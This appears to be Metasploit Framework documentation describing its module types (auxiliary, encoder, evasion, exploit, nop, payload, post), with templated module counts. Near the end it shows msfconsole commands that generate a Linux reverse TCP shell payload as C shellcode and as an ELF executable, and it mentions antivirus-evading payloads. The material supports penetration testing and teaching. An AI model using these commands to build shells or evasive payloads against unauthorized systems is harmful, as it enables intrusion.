## Metasploit modules

There are currently {{ site.metasploit_total_module_count }} Metasploit modules:

{{ site.metasploit_nested_module_counts | module_tree: "All Modules", true }}

## Module types

### Auxiliary modules ({{ site.metasploit_module_counts["auxiliary"] }})

Auxiliary modules do not exploit a target, but can perform useful tasks such as:

- Administration - Modify, operate, or manipulate something on target machine
- Analyzing - Tools that perform analysis, mostly password cracking
- Gathering - Gather, collect, or enumerate data from a single target
- Denial of Service - Crash or slow a target machine or service
- Scanning - Scan targets for known vulnerabilities
- Server Support - Run Servers for common protocols such as SMB, FTP, etc

### Encoder modules ({{ site.metasploit_module_counts["encoder"] }})

Encoders take the raw bytes of a payload and run some sort of encoding algorithm, like bitwise XOR. These modules are useful for encoding
bad characters such as null bytes.

### Evasion modules ({{ site.metasploit_module_counts["evasion"] }})

Evasion modules give Framework users the ability to generate evasive payloads that aim to evade AntiVirus, such as Windows Defender,
without having to install external tools.

### Exploit modules ({{ site.metasploit_module_counts["exploit"] }})

Exploit modules are used to leverage vulnerabilities in a manner that allows the framework to execute arbitrary code.
The arbitrary code that is executed is referred to as the payload.

### Nop modules ({{ site.metasploit_module_counts["nop"] }})

Nop modules, short for 'No Operation', generate a sequence of 'No Operation' instructions that perform no side-effects.
NOPs are often used in conjunction with stack buffer overflows.

### Payloads modules ({{ site.metasploit_module_counts["payload"] }})

In the context of Metasploit exploit modules, payload modules encapsulate the arbitrary code (shellcode) that is executed
as the result of an exploit succeeding. This normally involves the creation of a Metasploit session, but may instead
execute code such as adding user accounts, or executing a simple pingback command that verifies that code execution was successful against a vulnerable target.

Payload modules can also be used individually to generate standalone executables, or shellcode for use within exploits:

```msf
msf6 payload(linux/x86/shell_reverse_tcp) > back
msf6 > use payload/linux/x86/shell_reverse_tcp
msf6 payload(linux/x86/shell_reverse_tcp) > set lhost 127.0.0.1
lhost => 127.0.0.1
msf6 payload(linux/x86/shell_reverse_tcp) > set lport 4444
lport => 4444

# Generate a payload for use within C
msf6 payload(linux/x86/shell_reverse_tcp) > generate -f c

# Generate an ELF file for execution on Linux environments
msf6 payload(linux/x86/shell_reverse_tcp) > generate -f elf -o linux_shell
```

### Post modules ({{ site.metasploit_module_counts["post"] }})

These modules are useful after a machine has been compromised and a Metasploit session has been opened. They perform useful
tasks such as gathering, collecting, or enumerating data from a session.
